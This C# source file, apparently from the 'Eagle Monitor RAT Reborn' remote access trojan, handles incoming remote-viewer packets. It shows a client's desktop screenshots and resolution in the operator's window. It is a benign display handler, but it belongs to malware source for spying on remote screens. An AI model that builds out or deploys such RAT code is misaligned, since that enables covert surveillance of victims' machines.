using Eagle_Monitor_RAT_Reborn.Network;
using PacketLib.Packet;
using PacketLib.Utils;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.PacketHandler
{
    internal class RemoteViewerPacketHandler
    {
        public RemoteViewerPacketHandler(RemoteViewerPacket remoteViewerPacket) : base()//, ClientHandler clientHandler) : base() 
        {
            if (ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm != null)
            {
                ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopPictureBox.BeginInvoke((MethodInvoker)(() =>
                {
                    try
                    {
                        ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.hasAlreadyConnected = true;
                        if (remoteViewerPacket.desktopPicture != null)
                        {
                            ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopPictureBox.Image = ImageProcessing.BytesToImage(remoteViewerPacket.desktopPicture);
                            ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.hResol = remoteViewerPacket.hResol;
                            ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.vResol = remoteViewerPacket.vResol;
                        }
                        return;
                    }
                    catch { }
                }));
            }
            /*Task.Run(() => 
            {
                ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopPictureBox.BeginInvoke((MethodInvoker)(() =>
                {
                    try
                    {
                        ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.hasAlreadyConnected = true;
                        if (ImageProcessing.BytesToImage(remoteViewerPacket.desktopPicture) != null)
                            ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopPictureBox.Image = ImageProcessing.BytesToImage(remoteViewerPacket.desktopPicture);
                        ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.hResol = remoteViewerPacket.hResol;
                        ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.vResol = remoteViewerPacket.vResol;
                        return;
                    }
                    catch { }
                }));
            });*/
            /*try
            {
                ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopPictureBox.BeginInvoke((MethodInvoker)(() =>
                {
                    ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.hasAlreadyConnected = true;
                    if (ImageProcessing.BytesToImage(remoteViewerPacket.desktopPicture) != null)
                        ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopPictureBox.Image = ImageProcessing.BytesToImage(remoteViewerPacket.desktopPicture);
                    ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.hResol = remoteViewerPacket.hResol;
                    ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].clientForm.remoteDesktopHandler.vResol = remoteViewerPacket.vResol;
                }));
                return;
            }
            catch { }*/
        }
    }
}